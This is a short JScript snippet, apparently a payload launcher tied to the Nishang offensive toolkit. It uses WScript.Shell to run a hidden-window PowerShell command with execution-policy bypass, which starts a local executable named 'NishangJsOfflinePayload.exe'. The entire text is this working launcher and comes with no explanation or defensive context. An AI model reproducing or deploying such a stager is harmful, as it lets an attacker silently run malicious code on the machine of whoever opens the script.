c = "powershell -nop -exec bypass -c Start-Process  .\NishangJsOfflinePayload.exe";
r = new ActiveXObject("WScript.Shell").Run(c,0,true);
